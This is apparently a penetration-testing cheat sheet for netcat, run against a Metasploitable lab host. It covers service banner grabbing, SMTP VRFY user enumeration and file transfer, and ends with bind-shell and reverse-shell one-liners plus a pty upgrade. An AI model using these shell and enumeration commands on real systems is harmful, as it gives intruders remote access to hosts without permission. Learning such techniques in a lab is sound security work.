# Netcat (nc)
## Banner grabbing
### SSH
    nc -nv 192.168.4.32 22
    
    (UNKNOWN) [192.168.4.32] 22 (ssh) open
    SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

### HTTP
    nc -nv 192.168.4.32 80
    get / http/1.1 # hit 'enter' twice
    
    HTTP/1.1 400 Bad Request
    Date: Tue, 27 Feb 2024 16:47:41 GMT
    Server: Apache/2.2.8 (Ubuntu) DAV/2
    Content-Length: 323
    Connection: close
    Content-Type: text/html; charset=iso-8859-1
    
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>400 Bad Request</title>
    </head><body>
    <h1>Bad Request</h1>
    <p>Your browser sent a request that this server could not understand.<br />
    </p>
    <hr>
    <address>Apache/2.2.8 (Ubuntu) DAV/2 Server at metasploitable.localdomain Port 80</address>
    </body></html>

### FTP
    nc -nv 192.168.4.32 21
    
    (UNKNOWN) [192.168.4.32] 21 (ftp) open
    220 (vsFTPd 2.3.4)

### SMTP
    nc -nv 192.168.4.32 25
    
    (UNKNOWN) [192.168.4.32] 25 (smtp) open
    220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
    vrfy msfadmin
    252 2.0.0 msfadmin
    vrfy root
    252 2.0.0 root
    vrfy Administrator
    550 5.1.1 <Administrator>: Recipient address rejected: User unknown in local recipient table
    
## Transferring data
### Chat client
    SERVER													CLIENT
    nc -lnvp 1234
															nc -nv 192.168.4.25 1234
	INPUT: Hello world!
															OUTPUT: Hello world!
											
### File transfer (can also output the client input above to file)
    SERVER													CLIENT
    nc -lvnp 1324 > output.sh
    														nc -nv 192.168.4.25 1324 -w <n> < input.sh # -w wait for <n> seconds before timeout
    ./output.sh

## Bind shell
    SERVER													CLIENT
    nc -lvnp 1324 -e "/bin/bash" # cmd.exe on Windows
    														nc -nv 192.168.4.25 1234
    														OUTPUT: shell prompt

## Reverse shell
    SERVER													CLIENT
    nc -lvnp 1324
    														nc -nv 192.168.4.25 1324 -e /bin/bash # cmd.exe on Windows
    OUTPUT: no shell prompt; can use without prompt, or possibly use the following on linux:
    which python
    python -c "import pty;pty.spawn('/bin/bash')"

